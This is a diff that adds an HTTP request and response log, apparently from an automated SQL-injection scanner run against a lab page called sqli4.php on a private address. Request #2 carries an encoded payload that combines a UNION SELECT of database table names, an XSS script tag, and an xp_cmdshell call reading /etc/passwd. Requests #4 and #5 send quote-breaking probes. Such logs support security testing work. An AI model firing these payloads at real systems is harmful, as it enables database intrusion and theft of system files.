@@ -1,0 +1,140 @@
+HTTP request [#1]:
+POST /functions_external/sqli4.php HTTP/1.1
+Cache-Control: no-cache
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0
+Host: 192.168.25.165:8000
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-Type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 22
+Connection: close
+
+name=a&difficulty=None
+
+HTTP response [#1] (200 OK):
+Date: Mon, 05 Jan 2026 07:59:14 GMT
+Server: Apache/2.4.56 (Debian)
+X-Powered-By: PHP/8.0.30
+Vary: Accept-Encoding
+Content-Encoding: gzip
+Content-Length: 74
+Connection: close
+Content-Type: text/html; charset=UTF-8
+URI: http://192.168.25.165:8000/functions_external/sqli4.php
+
+Search: a, password<br>Query feedback: NO<br>Exception feedback: NO<br>
+
+############################################################################
+
+HTTP request [#2]:
+POST /functions_external/sqli4.php?IGvx=4137%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1
+Cache-Control: no-cache
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0
+Host: 192.168.25.165:8000
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-Type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 22
+Connection: close
+
+name=a&difficulty=None
+
+HTTP response [#2] (200 OK):
+Date: Mon, 05 Jan 2026 07:59:14 GMT
+Server: Apache/2.4.56 (Debian)
+X-Powered-By: PHP/8.0.30
+Vary: Accept-Encoding
+Content-Encoding: gzip
+Content-Length: 74
+Connection: close
+Content-Type: text/html; charset=UTF-8
+URI: http://192.168.25.165:8000/functions_external/sqli4.php?IGvx=4137%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23
+
+Search: a, password<br>Query feedback: NO<br>Exception feedback: NO<br>
+
+############################################################################
+
+HTTP request [#3]:
+POST /functions_external/sqli4.php HTTP/1.1
+Cache-Control: no-cache
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0
+Host: 192.168.25.165:8000
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-Type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 22
+Connection: close
+
+name=a&difficulty=None
+
+HTTP response [#3] (200 OK):
+Date: Mon, 05 Jan 2026 07:59:14 GMT
+Server: Apache/2.4.56 (Debian)
+X-Powered-By: PHP/8.0.30
+Vary: Accept-Encoding
+Content-Encoding: gzip
+Content-Length: 74
+Connection: close
+Content-Type: text/html; charset=UTF-8
+URI: http://192.168.25.165:8000/functions_external/sqli4.php
+
+Search: a, password<br>Query feedback: NO<br>Exception feedback: NO<br>
+
+############################################################################
+
+HTTP request [#4]:
+POST /functions_external/sqli4.php HTTP/1.1
+Cache-Control: no-cache
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0
+Host: 192.168.25.165:8000
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-Type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 63
+Connection: close
+
+name=%61%27%29%2E%28%28%22%29%28%2C%27%29%2E%29&difficulty=None
+
+HTTP response [#4] (200 OK):
+Date: Mon, 05 Jan 2026 07:59:14 GMT
+Server: Apache/2.4.56 (Debian)
+X-Powered-By: PHP/8.0.30
+Vary: Accept-Encoding
+Content-Encoding: gzip
+Content-Length: 85
+Connection: close
+Content-Type: text/html; charset=UTF-8
+URI: http://192.168.25.165:8000/functions_external/sqli4.php
+
+Search: a').((")(,').), password<br>Query feedback: NO<br>Exception feedback: NO<br>
+
+############################################################################
+
+HTTP request [#5]:
+POST /functions_external/sqli4.php HTTP/1.1
+Cache-Control: no-cache
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0
+Host: 192.168.25.165:8000
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-Type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 84
+Connection: close
+
+name=%61%27%29%27%78%52%58%79%6C%4E%3C%27%22%3E%4B%6A%5A%69%54%7A%29&difficulty=None
+
+HTTP response [#5] (200 OK):
+Date: Mon, 05 Jan 2026 07:59:14 GMT
+Server: Apache/2.4.56 (Debian)
+X-Powered-By: PHP/8.0.30
+Vary: Accept-Encoding
+Content-Encoding: gzip
+Content-Length: 94
+Connection: close
+Content-Type: text/html; charset=UTF-8
+URI: http://192.168.25.165:8000/functions_external/sqli4.php
+
+Search: a')'xRXylN<'">KjZiTz), password<br>Query feedback: NO<br>Exception feedback: NO<br>
+
+############################################################################
+
